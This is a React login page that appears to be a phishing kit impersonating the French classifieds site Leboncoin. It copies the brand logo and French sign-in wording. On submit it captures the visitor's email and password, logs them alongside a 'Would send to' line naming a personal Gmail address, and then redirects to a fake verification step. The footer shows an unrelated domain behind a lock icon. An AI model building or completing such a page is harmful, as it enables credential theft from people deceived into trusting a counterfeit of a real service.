
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { LeboncoinLogo } from '@/components/LeboncoinLogo';
import { useToast } from "@/components/ui/use-toast";
import { Eye, ChevronLeft } from 'lucide-react';

export default function LeboncoinLogin() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Simuler un délai de connexion
    setTimeout(() => {
      // Envoyer les données par console log
      console.log("Login attempt with:", { email, password });
      console.log("Would send to:", "kouadioyaojeancesar@gmail.com");
      
      // Rediriger vers la page de vérification
      navigate('/verification');
      setLoading(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <header className="border-b py-4 px-4">
        <div className="container mx-auto flex items-center">
          <button 
            onClick={() => navigate(-1)}
            className="mr-4 text-gray-600"
          >
            <ChevronLeft size={24} />
          </button>
          <LeboncoinLogo size="lg" />
        </div>
      </header>
      
      <div className="container mx-auto px-4 py-8 flex-1 flex flex-col items-center justify-center">
        <Card className="w-full max-w-md shadow-none border-0">
          <CardContent className="p-0">
            <div className="text-center mb-8">
              <h2 className="text-2xl font-semibold">Bonjour !</h2>
              <p className="text-gray-600 mt-2">Connectez-vous pour découvrir toutes nos fonctionnalités.</p>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                  E-mail
                </label>
                <Input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="w-full"
                />
              </div>
              
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-1">
                  Mot de Passe
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                    className="w-full pr-10"
                  />
                  <button
                    type="button"
                    className="absolute inset-y-0 right-0 pr-3 flex items-center"
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    <Eye size={20} className="text-gray-400" />
                  </button>
                </div>
                <a href="#" className="text-blue-500 text-sm mt-1 inline-block">
                  Mot de passe oublié
                </a>
              </div>
              
              <Button 
                type="submit" 
                className="w-full bg-blue-500 hover:bg-blue-600"
                disabled={loading}
              >
                {loading ? "Connexion..." : "Se connecter"}
              </Button>
            </form>
            
            <div className="text-center mt-8">
              <p className="text-gray-700">
                Envie de nous rejoindre ? <a href="#" className="text-blue-500 font-medium">Créer un compte</a>
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
      
      <footer className="py-4 border-t text-center text-xs text-gray-500">
        <p>🔒 jiwled.n0c.world</p>
      </footer>
    </div>
  );
}
